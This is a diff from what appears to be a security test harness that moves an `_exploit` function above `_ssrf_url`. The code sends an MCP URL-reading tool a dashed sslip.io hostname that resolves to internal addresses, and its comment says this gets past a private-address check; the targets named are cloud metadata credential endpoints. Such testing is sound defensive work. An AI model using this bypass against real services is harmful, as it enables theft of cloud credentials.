@@ -30,6 +30,13 @@ AIM = re.compile(r"169-254-")
 KEPT_PLACES: tuple[str, ...] = ("imds", "ecs-task-credentials", "eks-pod-identity")
 
 
+def _exploit(place_id: str) -> Callable[[Places, MCPClientPort], Awaitable[None]]:
+    async def run(places: Places, client: MCPClientPort) -> None:
+        await client.call_tool("web_url_read", {"url": _ssrf_url(places, place_id)})
+
+    return run
+
+
 def _ssrf_url(places: Places, place_id: str) -> str:
     # sslip.io resolves a dashed IPv4 label to that IPv4, giving a public-looking hostname that
     # resolves to the planted internal address. The dashed form never starts with a private
@@ -37,13 +44,6 @@ def _ssrf_url(places: Places, place_id: str) -> str:
     coordinates = places[place_id].coordinates
     dashed_host = f"{coordinates.host}".replace(".", "-")
     return f"http://{dashed_host}.sslip.io{coordinates.path}"
-
-
-def _exploit(place_id: str) -> Callable[[Places, MCPClientPort], Awaitable[None]]:
-    async def run(places: Places, client: MCPClientPort) -> None:
-        await client.call_tool("web_url_read", {"url": _ssrf_url(places, place_id)})
-
-    return run
 
 
 async def _benign(places: Places, client: MCPClientPort) -> None:
